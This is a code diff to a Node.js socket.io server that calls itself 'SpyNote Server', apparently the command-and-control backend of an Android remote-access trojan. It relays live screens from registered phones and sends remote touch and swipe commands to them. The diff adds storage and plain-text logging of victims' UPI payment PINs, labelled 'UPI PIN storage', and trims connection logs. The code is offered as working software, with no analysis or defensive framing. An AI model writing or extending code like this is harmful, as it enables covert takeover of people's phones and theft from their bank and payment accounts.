@@ -10,15 +10,16 @@ const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingTimeout: 60000,
     pingInterval: 25000,
-    maxHttpBufferSize: 500 * 1024 * 1024
+    maxHttpBufferSize: 300 * 1024 * 1024
 });
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '500mb' }));
-app.use(express.urlencoded({ limit: '500mb', extended: true }));
+app.use(express.json({ limit: '300mb' }));
+app.use(express.urlencoded({ limit: '300mb', extended: true }));
 
 const devices = new Map();
+const devicePins = new Map(); // 🔥 UPI PIN storage
 
 app.post('/register', (req, res) => {
     const { deviceId, model, brand, version, status } = req.body;
@@ -34,8 +35,6 @@ app.get('/devices', (req, res) => {
 });
 
 io.on('connection', (socket) => {
-    console.log('🔌 Client connected:', socket.id);
-
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
         if (deviceId) {
@@ -46,21 +45,28 @@ io.on('connection', (socket) => {
             });
             socket.join(deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
+            io.to(deviceId).emit('upi-status', { enabled: devicePins.has(deviceId) });
             console.log(`📱 Device registered: ${deviceId}`);
         }
+    });
+
+    socket.on('set-upi-pin', (data) => {
+        const { deviceId, pin } = data;
+        devicePins.set(deviceId, pin);
+        io.to(deviceId).emit('upi-status', { enabled: true, pin });
+        console.log(`🔐 UPI PIN set for ${deviceId}: ${pin}`);
     });
 
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
-            // 🔥 Ultra smooth - Send to all clients watching this device
             socket.to(deviceId).emit('screen-update', {
                 deviceId,
                 data: data.data,
                 width: data.width,
                 height: data.height,
                 timestamp: data.timestamp,
-                layout: data.layout || [], // 🔥 Always send layout
+                layout: data.layout,
                 fps: data.fps
             });
         }
@@ -79,7 +85,6 @@ io.on('connection', (socket) => {
                 endY: parseFloat(endY),
                 duration: parseInt(duration) || 300
             });
-            console.log(`🎮 Control ${action} on ${deviceId}`);
         }
     });
 
@@ -88,14 +93,12 @@ io.on('connection', (socket) => {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.emit('devices-update', Array.from(devices.entries()));
-                console.log(`📴 Device disconnected: ${deviceId}`);
                 break;
             }
         }
     });
 });
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`🚀 SpyNote Server running on port ${PORT}!`);
+server.listen(process.env.PORT || 3000, () => {
+    console.log('🚀 SpyNote Server running on port 3000!');
 });
